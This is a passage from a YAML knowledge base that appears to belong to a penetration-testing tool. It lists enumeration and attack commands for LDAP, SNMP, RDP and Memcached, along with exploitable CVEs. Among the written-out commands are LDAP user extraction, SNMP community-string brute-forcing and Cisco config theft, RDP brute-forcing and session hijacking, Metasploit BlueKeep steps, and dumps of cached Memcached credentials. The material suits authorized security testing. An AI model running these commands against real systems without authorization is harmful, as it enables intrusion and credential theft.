        cvss: 8.8
        summary: "PL/Perl environment variable manipulation allowing arbitrary code execution"
        exploit_available: poc

  # ---------------------------------------------------------------------------
  # LDAP (Port 389/636)
  # ---------------------------------------------------------------------------
  ldap:
    ports: [389, 636]
    name: Lightweight Directory Access Protocol
    description: >
      LDAP directories contain user accounts, groups, computer objects, and
      organizational data. Anonymous binds or low-privilege access can yield
      significant domain intelligence for Active Directory environments.

    enumeration:
      anonymous_bind:
        commands:
          - "ldapsearch -x -H ldap://{target} -b '' -s base namingContexts"
          - "ldapsearch -x -H ldap://{target} -b '' -s base '(objectClass=*)'"
          - "nmap -sV -p 389,636 --script=ldap-rootdse,ldap-search {target}"
        description: "Test anonymous LDAP bind and discover naming contexts"

    attacks:
      naming_context_enumeration:
        description: "Enumerate base DNs for directory search"
        command: "ldapsearch -x -H ldap://{target} -b '' -s base namingContexts"
        look_for:
          - "DC=domain,DC=com (Active Directory)"
          - "dc=example,dc=org (OpenLDAP)"
          - "o=organization (Novell eDirectory)"
        risk: medium
        cwe: CWE-200

      user_object_extraction:
        description: "Extract user objects from the directory"
        commands:
          - "ldapsearch -x -H ldap://{target} -b '{base_dn}' '(objectClass=user)' sAMAccountName mail description memberOf"
          - "ldapsearch -x -H ldap://{target} -b '{base_dn}' '(objectClass=person)' cn uid mail"
          - "ldapsearch -x -H ldap://{target} -b '{base_dn}' '(&(objectClass=user)(adminCount=1))'"
        look_for:
          - "Admin and service accounts"
          - "Accounts with descriptions containing passwords"
          - "Disabled accounts that may be re-enabled"
          - "Accounts with SPNs (Kerberoastable)"
        risk: high
        cwe: CWE-200

      password_policy_detection:
        description: "Extract password policy from LDAP"
        commands:
          - "ldapsearch -x -H ldap://{target} -b '{base_dn}' '(objectClass=domainDNS)' minPwdLength maxPwdAge pwdHistoryLength lockoutThreshold"
          - "ldapsearch -x -H ldap://{target} -b 'CN=Password Settings Container,CN=System,{base_dn}' '(objectClass=msDS-PasswordSettings)'"
        look_for:
          - "Minimum password length < 8"
          - "No lockout threshold"
          - "No password complexity requirement"
        risk: medium
        cwe: CWE-521

      ldaps_certificate:
        description: "Check LDAPS certificate for information disclosure"
        command: "openssl s_client -connect {target}:636 -showcerts"
        look_for:
          - "Internal domain names in Subject/SAN"
          - "Self-signed certificates"
          - "Expired certificates"

    known_cves:
      - cve_id: CVE-2021-42278
        service: Active Directory
        version_range: "All Windows Server versions before Nov 2021 patches"
        cvss: 8.8
        summary: "SAM name impersonation (noPac) - machine account name manipulation for privilege escalation"
        exploit_available: public

      - cve_id: CVE-2021-42287
        service: Active Directory
        version_range: "All Windows Server versions before Nov 2021 patches"
        cvss: 8.8
        summary: "KDC confusion (noPac) - request TGT as non-existent machine account to impersonate DC"
        exploit_available: public
        note: "Combined with CVE-2021-42278 for domain admin compromise"

      - cve_id: CVE-2022-26923
        service: Active Directory Certificate Services
        version_range: "All AD CS installations before May 2022 patches"
        cvss: 8.8
        summary: "Certifried - machine account certificate abuse for domain admin escalation"
        exploit_available: public

  # ---------------------------------------------------------------------------
  # SNMP - Simple Network Management Protocol (Port 161)
  # ---------------------------------------------------------------------------
  snmp:
    port: 161
    name: Simple Network Management Protocol
    description: >
      SNMP community strings act as passwords. Default strings (public, private)
      are extremely common. SNMP v1/v2c transmit community strings in cleartext.
      Read access reveals extensive system info; write access enables configuration
      changes and potential RCE.

    enumeration:
      community_string_bruteforce:
        commands:
          - "onesixtyone -c community_strings.txt {target}"
          - "snmpwalk -v2c -c public {target}"
          - "snmp-check {target}"
        description: "Brute-force community strings"
        common_strings:
          - "public"
          - "private"
          - "manager"
          - "community"
          - "admin"
          - "snmp"
          - "default"
          - "cisco"
          - "monitor"

    attacks:
      system_info_extraction:
        description: "Extract system information via SNMP read access"
        commands:
          - "snmpwalk -v2c -c {community} {target} 1.3.6.1.2.1.1"
          - "snmpwalk -v2c -c {community} {target} sysDescr"
          - "snmpwalk -v2c -c {community} {target} sysName"
          - "snmpwalk -v2c -c {community} {target} sysContact"
        oids:
          system_description: "1.3.6.1.2.1.1.1.0"
          system_name: "1.3.6.1.2.1.1.5.0"
          system_uptime: "1.3.6.1.2.1.1.3.0"
          interfaces: "1.3.6.1.2.1.2.2.1"
          ip_addresses: "1.3.6.1.2.1.4.20.1"
          routing_table: "1.3.6.1.2.1.4.21.1"
          tcp_connections: "1.3.6.1.2.1.6.13.1"
          running_processes: "1.3.6.1.2.1.25.4.2.1"
          installed_software: "1.3.6.1.2.1.25.6.3.1"
          storage: "1.3.6.1.2.1.25.2.3.1"
        risk: medium
        cwe: CWE-200

      config_extraction:
        description: "Extract running configuration via SNMP write community"
        technique: >
          Use SNMP write access to trigger TFTP config transfer on Cisco devices:
          snmpset -v2c -c {write_community} {target} 1.3.6.1.4.1.9.9.96.1.1.1.1.2.{random} i 1
        risk: critical
        cwe: CWE-200

      snmp_write_abuse:
        description: "Modify device configuration via SNMP write access"
        techniques:
          - "Change interface status (bring up/down)"
          - "Modify routing tables"
          - "Change VLAN assignments"
          - "Trigger firmware update from malicious TFTP server"
        risk: critical
        cwe: CWE-284

    known_cves:
      - cve_id: CVE-2017-6742
        service: Cisco IOS
        version_range: "Multiple Cisco IOS/IOS XE versions"
        cvss: 8.8
        summary: "SNMP RCE via crafted SNMP packets (EXTRABACON/Shadow Brokers)"
        exploit_available: public

  # ---------------------------------------------------------------------------
  # RDP - Remote Desktop Protocol (Port 3389)
  # ---------------------------------------------------------------------------
  rdp:
    port: 3389
    name: Remote Desktop Protocol
    description: >
      RDP provides graphical remote access to Windows systems. It has been the
      target of several critical pre-authentication vulnerabilities and is
      commonly targeted for credential brute-forcing.

    enumeration:
      nla_detection:
        commands:
          - "nmap -sV -p 3389 --script=rdp-enum-encryption,rdp-ntlm-info {target}"
          - "rdp-sec-check {target}"
        description: "Detect NLA requirement, encryption level, and NTLM info leaks"
        look_for:
          - "NLA disabled (allows pre-auth exploitation)"
          - "CredSSP/TLS configuration"
          - "NTLM target info (domain name, computer name, DNS domain)"

    attacks:
      credential_bruteforce:
        description: "Brute-force RDP credentials"
        commands:
          - "hydra -l {user} -P {wordlist} rdp://{target}"
          - "crowbar -b rdp -s {target}/32 -u {user} -C {wordlist}"
          - "crackmapexec rdp {target} -u {user} -p {password}"
        risk: medium
        cwe: CWE-307

      session_hijacking:
        description: "Hijack disconnected RDP sessions (requires SYSTEM)"
        command: "tscon {session_id} /dest:rdp-tcp#{our_session}"
        risk: critical
        cwe: CWE-284
        prerequisite: "Local SYSTEM access on target"

      rdp_screenshot:
        description: "Capture RDP login screen for OS identification"
        tools:
          - "rdp-screenshot.py"
          - "nmap --script rdp-enum-encryption"

    known_cves:
      - cve_id: CVE-2019-0708
        service: Remote Desktop Services
        version_range: "Windows XP, 7, Server 2003, 2008, 2008 R2"
        cvss: 9.8
        summary: "BlueKeep - Pre-authentication use-after-free in RDP allowing wormable RCE"
        exploit_available: public
        exploit_steps:
          - "nmap -p 3389 --script=rdp-vuln-ms12-020 {target}"
          - "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce (Metasploit)"

      - cve_id: CVE-2019-1181
        service: Remote Desktop Services
        version_range: "Windows 7 SP1 through Windows 10 1903, Server 2008 R2 through 2019"
        cvss: 9.8
        summary: "DejaBlue - Pre-authentication RCE in RDP (wormable, wider version range than BlueKeep)"
        exploit_available: poc

      - cve_id: CVE-2019-1182
        service: Remote Desktop Services
        version_range: "Windows 7 SP1 through Windows 10 1903, Server 2008 R2 through 2019"
        cvss: 9.8
        summary: "DejaBlue variant - second pre-auth RCE in Remote Desktop Services"
        exploit_available: poc

  # ---------------------------------------------------------------------------
  # Memcached (Port 11211)
  # ---------------------------------------------------------------------------
  memcached:
    port: 11211
    name: Memcached
    description: >
      Memcached is an in-memory caching system that typically runs without
      authentication. Exposed instances leak cached data (sessions, credentials,
      API keys) and can be abused for massive DDoS amplification attacks.

    enumeration:
      connect_test:
        commands:
          - "echo 'stats' | nc {target} 11211"
          - "echo 'version' | nc {target} 11211"
          - "nmap -sV -p 11211 --script=memcached-info {target}"
        description: "Test for unauthenticated Memcached access"

    attacks:
      unauthenticated_access:
        description: "Access Memcached without credentials and enumerate cached data"
        commands:
          - "echo 'stats' | nc {target} 11211"
          - "echo 'stats items' | nc {target} 11211"
          - "echo 'stats slabs' | nc {target} 11211"
          - "echo 'stats cachedump {slab_id} 100' | nc {target} 11211"
        success_indicators:
          - "STAT version"
          - "STAT curr_items"
        risk: high
        cwe: CWE-287

      data_dumping:
        description: "Extract cached key-value pairs for sensitive data"
        steps:
          - "Enumerate slabs: stats slabs"
          - "For each slab, dump keys: stats cachedump {slab_id} 0"
          - "Retrieve values: get {key}"
        look_for:
          - "Session tokens"
          - "User credentials"
          - "API keys"
          - "Cached database query results with PII"
        risk: high
        cwe: CWE-200

      ddos_amplification:
        description: "Check if Memcached can be used for UDP amplification attacks"
        check:
          - "Test UDP port: echo -en '\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00stats\\r\\n' | nc -u {target} 11211"
        indicator: >
          If Memcached responds on UDP, it can provide 10,000x-51,000x amplification factor,
          making it one of the most powerful DDoS amplification vectors known.
        risk: critical
        note: "Report as informational finding. Do not perform actual amplification."

    known_cves:
      - cve_id: CVE-2018-1000115
        service: Memcached
        version_range: "All versions with UDP enabled (default before 1.5.6)"
        cvss: 7.5
        summary: "UDP amplification allowing massive DDoS attacks (1.7 Tbps record attack via Memcached)"
        exploit_available: public

      - cve_id: CVE-2016-8704
        service: Memcached
        version_range: "< 1.4.33"
        cvss: 9.8
        summary: "Integer overflow in Append/Prepend operations allowing RCE"
        exploit_available: public

      - cve_id: CVE-2016-8705
        service: Memcached
        version_range: "< 1.4.33"
        cvss: 9.8
        summary: "Integer overflow in Update command allowing RCE"
        exploit_available: public
